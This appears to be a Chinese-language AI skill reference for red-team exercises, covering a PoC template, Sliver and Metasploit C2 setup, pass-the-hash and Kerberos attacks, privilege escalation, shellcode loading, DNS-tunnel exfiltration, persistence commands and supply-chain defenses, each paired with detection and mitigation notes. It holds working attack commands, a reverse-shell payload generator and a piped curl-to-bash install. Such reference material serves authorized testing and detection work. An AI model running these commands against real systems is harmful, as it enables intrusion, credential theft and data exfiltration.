---
name: red-team
description: 对抗性安全测试参考。攻击模拟方法论、防御验证技术、检测规则开发依据。用于授权红队演练、CTF竞赛、防御体系验证。当用户提到红队、PoC、安全模拟、横向移动、权限验证、防御测试时使用。
---

# 赤焰秘典 · 红队攻击 (Red Team)

> **对抗性安全测试参考文档**：本文档为安全工程师提供攻击模拟方法论，用于验证防御体系有效性。
> 每项攻击技术均附带检测指标和缓解建议，服务于"知攻善防"的安全建设。
> 所有示例使用保留地址（`192.0.2.x`、`198.51.100.x`）和占位符凭证。


## 攻击链 (Kill Chain)

```
侦察 → 武器化 → 投递 → 利用 → 安装 → C2 → 行动
  │        │       │      │       │      │      │
  └─ OSINT ─┴─ PoC ─┴─ 钓鱼 ─┴─ 提权 ─┴─ 持久 ─┴─ 横向
```

## PoC 开发

### 标准 PoC 结构
```python
#!/usr/bin/env python3
"""
[Defense Validation] PoC 模板
漏洞名称: CVE-XXXX-XXXX
影响版本: x.x.x - x.x.x
漏洞类型: RCE/SQLi/XSS/SSRF
"""
import requests
import argparse

class POC:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }

    def check(self) -> bool:
        """无害检测——使用延时、DNS外带等非破坏方式验证"""
        try:
            pass
        except Exception as e:
            return False

    def exploit(self, cmd: str) -> str:
        """漏洞利用——仅限授权目标"""
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cmd', default='id')
    args = parser.parse_args()

    poc = POC(args.url)
    if poc.check():
        print(f"[+] Vulnerable!")
        print(poc.exploit(args.cmd))
    else:
        print("[-] Not vulnerable")

if __name__ == '__main__':
    main()
```

**防御**：WAF 规则、输入校验、及时补丁、漏洞披露流程（Responsible Disclosure）

## C2 框架

> 以下 C2 工具用于授权红队演练中的远程管理。蓝队应熟悉这些工具的流量特征以建立检测规则。

### Sliver (推荐开源)
```bash
# [Defense Validation] 安装
curl https://sliver.sh/install | sudo bash

# 生成 Implant（替换为授权测试 IP）
sliver > generate --mtls 198.51.100.10 --os windows --save implant.exe
sliver > generate --http 198.51.100.10 --os linux --save implant

# 启动监听
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > http --lhost 0.0.0.0 --lport 80

# 会话操作
sliver > sessions
sliver > use SESSION_ID
sliver (SESSION) > shell
sliver (SESSION) > download /etc/passwd
sliver (SESSION) > upload local remote
```

**检测**：监控异常出站连接、TLS 证书指纹、JA3/JA3S 签名、进程行为异常

### Metasploit
```bash
# [Defense Validation] 生成 Payload（替换为授权测试 IP）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=198.51.100.10 LPORT=4444 -f exe > shell.exe

# 监听
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 0.0.0.0
msf6 > run

# Meterpreter
meterpreter > getsystem
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
```

**检测**：Meterpreter 默认端口/流量特征、AV/EDR 签名、命名管道监控

### 简易 HTTP C2（教学用）
```python
# [Defense Validation] 教学用最小 C2 示例，演示 beacon 通信原理
from flask import Flask, request, jsonify
import base64

app = Flask(__name__)
agents, tasks = {}, {}

@app.route('/beacon/<agent_id>')
def beacon(agent_id):
    if tasks.get(agent_id):
        return jsonify({"task": tasks[agent_id].pop(0)})
    return jsonify({"task": None})

@app.route('/result/<agent_id>', methods=['POST'])
def result(agent_id):
    output = base64.b64decode(request.json['output']).decode()
    print(f"[{agent_id}] {output}")
    return jsonify({"status": "ok"})
```

**检测**：周期性 HTTP beacon 模式、异常 User-Agent、base64 编码 POST body、DNS 异常查询频率

## 横向移动

> 横向移动是红队演练中验证网络分段和凭证隔离的关键环节。蓝队应重点监控以下技术的检测指标。

### Pass-the-Hash (PTH)
```bash
# [Defense Validation] Impacket（替换为授权目标）
psexec.py -hashes :<NTLM_HASH> administrator@<TARGET>
wmiexec.py -hashes :<NTLM_HASH> administrator@<TARGET>
smbexec.py -hashes :<NTLM_HASH> administrator@<TARGET>

# CrackMapExec
crackmapexec smb <TARGET> -u admin -H <HASH> -x "whoami"
crackmapexec smb 198.51.100.0/24 -u admin -H <HASH> --shares

# Mimikatz
sekurlsa::pth /user:admin /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
```

**检测**：Event ID 4624 Type 3 + NTLM 认证、异常 SMB 连接、Mimikatz 内存特征
**缓解**：Credential Guard、LAPS、禁用 NTLM、网络分段

### Pass-the-Ticket (PTT)
```bash
# [Defense Validation] 导出票据
mimikatz # sekurlsa::tickets /export

# 注入票据
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

**检测**：Event ID 4768/4769 异常、票据加密类型降级、非常规 SPN 请求

### Kerberos 攻击
```bash
# [Defense Validation] Kerberoasting
GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request

# AS-REP Roasting
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP>

# Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt
```

**检测**：大量 TGS 请求（Kerberoasting）、RC4 加密降级、异常 TGT 生命周期
**缓解**：AES 加密 SPN、长随机密码服务账户、定期轮换 krbtgt

### 远程执行方法
```bash
# [Defense Validation] WinRM
evil-winrm -i <TARGET> -u user -H <HASH>

# PowerShell Remoting
Enter-PSSession -ComputerName <TARGET> -Credential <DOMAIN>\user
Invoke-Command -ComputerName <TARGET> -ScriptBlock {whoami}

# WMI
wmic /node:<TARGET> /user:admin /password:<REDACTED> process call create "cmd.exe /c whoami"
```

**检测**：WinRM/WMI 事件日志、PowerShell ScriptBlock Logging、异常远程进程创建

## 权限提升

> 提权是红队验证最小权限原则和系统加固效果的核心手段。

### Windows 提权
```powershell
# [Defense Validation] 信息收集
whoami /priv
systeminfo
net user
net localgroup administrators

# 常见提权路径
# - SeImpersonatePrivilege → Potato系列
# - 服务配置错误 → 服务路径劫持
# - 计划任务 → 任务劫持
# - AlwaysInstallElevated → MSI提权
# - 未打补丁 → 内核漏洞

# Potato 提权
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

**检测**：SeImpersonatePrivilege 滥用、异常服务创建、Potato 工具签名
**缓解**：最小权限、及时补丁、移除不必要的特权、AppLocker/WDAC

### Linux 提权
```bash
# [Defense Validation] 信息收集
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null

# 常见提权路径
# - SUID 二进制 → GTFOBins
# - sudo 配置错误 → sudo提权
# - 内核漏洞 → DirtyPipe/DirtyCow
# - 定时任务 → cron劫持
# - 容器逃逸 → Docker/K8s

# SUID 利用
find / -perm -4000 2>/dev/null
# 查 GTFOBins: https://gtfobins.github.io/
```

**检测**：异常 SUID 执行、sudo 日志审计、内核 exploit 特征
**缓解**：最小化 SUID、sudoers 白名单、内核及时更新、seccomp/AppArmor

## 免杀技术

> 理解免杀原理是构建有效 EDR/AV 检测规则的前提。以下技术用于红队演练中验证防御覆盖率。

### 基础免杀
```python
# [Defense Validation] 常见混淆手法——蓝队需针对性建立检测规则

# 1. 字符串混淆
import base64
encoded = base64.b64encode(b"<PAYLOAD-PLACEHOLDER>").decode()
exec(base64.b64decode(encoded))

# 2. 动态加载
import importlib
module = importlib.import_module("os")
getattr(module, "system")("whoami")

# 3. 加密 Payload（运行时解密执行）
from Crypto.Cipher import AES
# AES 解密后执行——检测点：运行时内存中的解密行为
```

**检测**：base64/AES 解码后 exec 调用、动态 import + getattr 模式、内存扫描
**缓解**：AMSI（Windows）、行为检测、内存保护、代码签名强制

### Shellcode 加载（教学用）
```python
# [Defense Validation] 演示 Windows shellcode 加载原理——蓝队检测重点
import ctypes

shellcode = b"\xcc" * 64  # 占位符，实际由 msfvenom 等工具生成

# Windows API 调用链：VirtualAlloc → RtlMoveMemory → CreateThread
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
```

**检测**：VirtualAlloc + RWX 内存分配、CreateThread 指向非模块地址、ETW 跟踪
**缓解**：CFG、ACG、CIG（代码完整性保护）、EDR 内存扫描

### 隐蔽通信
```python
# [Defense Validation] 演示隐蔽信道原理——蓝队需监控这些异常流量模式

# DNS 隧道
def dns_exfil(data, domain):
    import dns.resolver
    encoded = base64.b32encode(data.encode()).decode()
    for chunk in [encoded[i:i+63] for i in range(0, len(encoded), 63)]:
        dns.resolver.resolve(f"{chunk}.example.com", 'A')

# 域前置
def domain_fronting(real_host, cdn_domain, data):
    headers = {"Host": real_host}
    requests.post(f"https://{cdn_domain}/api", json=data, headers=headers)
```

**检测**：DNS 查询频率/长度异常、TXT/CNAME 大量查询、Host 头与 SNI 不匹配
**缓解**：DNS 监控/过滤、TLS 检查、出站代理白名单

## 持久化

> 理解持久化手法是蓝队建立基线和异常检测的基础。红队演练中用于验证持久化检测覆盖率。

### Windows
```powershell
# [Defense Validation] 常见持久化手法——蓝队需逐一建立检测规则

# 注册表 Run 键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "<NAME>" /t REG_SZ /d "<PATH>"

# 计划任务
schtasks /create /tn "<NAME>" /tr "<PATH>" /sc onlogon

# 服务
sc create <NAME> binPath= "<PATH>" start= auto

# WMI 事件订阅（进程启动时触发）
```

**检测**：Sysmon Event ID 12/13（注册表）、Event ID 4698（计划任务创建）、服务创建事件
**缓解**：注册表审计、计划任务白名单、服务签名验证、WMI 订阅监控

### Linux
```bash
# [Defense Validation] 常见持久化手法

# Crontab
echo "* * * * * <PATH>" >> /var/spool/cron/root

# SSH 密钥
echo "ssh-rsa <PUBKEY>..." >> ~/.ssh/authorized_keys

# Systemd 服务
# 创建 /etc/systemd/system/<name>.service

# LD_PRELOAD
echo "<PATH>" >> /etc/ld.so.preload
```

**检测**：crontab 变更审计、authorized_keys 文件监控、新增 systemd unit、ld.so.preload 修改
**缓解**：文件完整性监控（AIDE/OSSEC）、immutable 属性、SELinux/AppArmor 强制模式

## 工具清单

| 工具 | 用途 |
|------|------|
| Sliver | 开源 C2 框架 |
| Metasploit | 渗透测试框架 |
| Cobalt Strike | 商业 C2 |
| Impacket | Windows 协议工具 |
| CrackMapExec | 批量横向 |
| Mimikatz | 凭证提取 |
| Rubeus | Kerberos 工具 |
| BloodHound | AD 路径分析 |

## 供应链安全

> 供应链攻击是当前最高风险威胁之一。红队需模拟这些向量以验证组织的供应链防御能力。

### 供应链攻击向量
```
源代码 → 构建 → 制品 → 分发 → 部署 → 运行
   │       │      │      │      │      │
   投毒    篡改   后门   劫持   提权   横向
```

| 阶段 | 攻击方式 | 已知案例 |
|------|----------|----------|
| 源代码 | 依赖投毒 | event-stream、ua-parser-js |
| 构建 | CI/CD 劫持 | SolarWinds、CodeCov |
| 制品 | 恶意包 | PyPI/npm typosquatting |
| 部署 | 配置篡改 | K8s YAML 注入 |
| 运行 | 容器逃逸 | 特权容器、内核漏洞 |

### SBOM + 依赖扫描
```bash
# SBOM 生成 (Syft)
syft nginx:latest -o cyclonedx-json > sbom.json

# 漏洞扫描 (Trivy)
trivy image --severity HIGH,CRITICAL nginx:latest
trivy fs --scanners vuln,secret,misconfig .

# 依赖扫描 (Grype)
grype sbom:./sbom.json
```

### 签名验证 (Sigstore/Cosign)
```bash
cosign sign --key cosign.key myregistry/myapp:v1.0
cosign verify --key cosign.pub myregistry/myapp:v1.0
cosign attach sbom --sbom sbom.json myregistry/myapp:v1.0
cosign verify-attestation --key cosign.pub myregistry/myapp:v1.0
```

### SLSA 等级
```
Level 1: 文档化构建  Level 2: 防篡改+签名来源
Level 3: 安全平台+隔离构建  Level 4: 双方审查+密封构建
```

### 供应链安全检查清单
```yaml
源代码:
  - [ ] 分支保护 + 代码审查 + 依赖锁定 + 密钥泄露扫描
构建与制品:
  - [ ] 托管CI/CD + 隔离构建 + 生成SBOM + 签名制品 + 漏洞扫描
部署与运行:
  - [ ] 验证签名(Cosign/SLSA) + 准入控制(Kyverno/OPA) + 运行时监控
```

---

